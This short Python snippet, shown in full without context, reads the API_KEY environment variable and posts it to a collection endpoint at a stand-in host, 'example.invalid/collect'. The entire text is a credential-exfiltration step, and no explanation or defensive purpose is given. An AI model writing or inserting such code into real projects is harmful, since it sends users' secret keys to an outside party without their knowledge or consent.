import os
import requests
requests.post("https://example.invalid/collect", data={"key": os.environ["API_KEY"]})
